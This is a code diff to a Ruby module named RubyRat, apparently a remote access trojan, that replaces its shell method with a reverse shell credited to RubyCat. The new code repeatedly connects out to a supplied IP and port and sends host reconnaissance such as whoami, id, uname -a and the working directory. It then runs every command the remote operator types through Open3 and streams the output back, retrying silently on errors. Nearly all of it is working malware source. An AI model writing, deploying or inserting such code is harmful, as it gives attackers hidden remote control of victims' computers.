@@ -108,19 +108,80 @@ module RubyRat
       `ipconfig /all`
     end
 
-    def self.shell(host, port)
-      sleep(1.5) # prevent weird timing issue
-      sock = TCPSocket.new host, port
-
+    # brought to you in part by: https://github.com/Hood3dRob1n/RubyCat/blob/master/rubycat.rb
+    def self.shell(ip, port, retries=5)
+      while retries.to_i > 0
       begin
-        while line = sock.gets
-          Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
-            IO.copy_stream(stdout_and_stderr, sock)
-          end
-        end
+        socket = TCPSocket.new "#{ip}", "#{port}"
+        break
       rescue
+        # If we fail to connect, wait a few and try again
+        sleep 10
+        retries = retries.to_i - 1
         retry
       end
+    end
+    # Run commands with output sent to stdout and stderr
+    begin
+      socket.puts "Server Info:"
+      # First we scrape some basic info....
+      if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
+        count=0
+        while count.to_i < 3
+          if count.to_i == 0
+            command="echo Winblows"
+            socket.print "BUILD: \n"
+          elsif count.to_i == 1
+            command="whoami"
+            socket.print "ID: "
+          elsif count.to_i == 2
+            command="chdir"
+            socket.print "PWD: "
+          end
+          count = count.to_i + 1
+          # Open3 to exec
+          Open3.popen2e("#{command}") do | stdin, stdothers |
+            IO.copy_stream(stdothers, socket)
+          end
+        end
+      else
+        count=0
+        while count.to_i < 3
+          if count.to_i == 0
+            command="uname -a"
+            socket.print "BUILD: \n"
+          elsif count.to_i == 1
+            command="id"
+            socket.print "ID: "
+          elsif count.to_i == 2
+            command="pwd"
+            socket.print "PWD: "
+          end
+          count = count.to_i + 1
+          # Oen3 to exec
+          Open3.popen2e("#{command}") do | stdin, stdothers |
+            IO.copy_stream(stdothers, socket)
+          end
+        end
+      end
+      # Now we drop to Pseudo shell :)
+      while(true)
+        socket.print "\n(RubyCat)> "
+        command = socket.gets.chomp
+        if command.downcase == 'exit' or command.downcase == 'quit'
+          socket.puts "\nOK, closing connection....\n"
+          socket.puts "\ngot r00t?\n\n"
+          break # Exit when asked nicely :p
+        end
+        # Open3 to exec
+        Open3.popen2e("#{command}") do | stdin, stdothers |
+          IO.copy_stream(stdothers, socket)
+        end
+      end
+    rescue
+      # If we fail for some reason, try again
+      retry
+    end
     end
 
   end
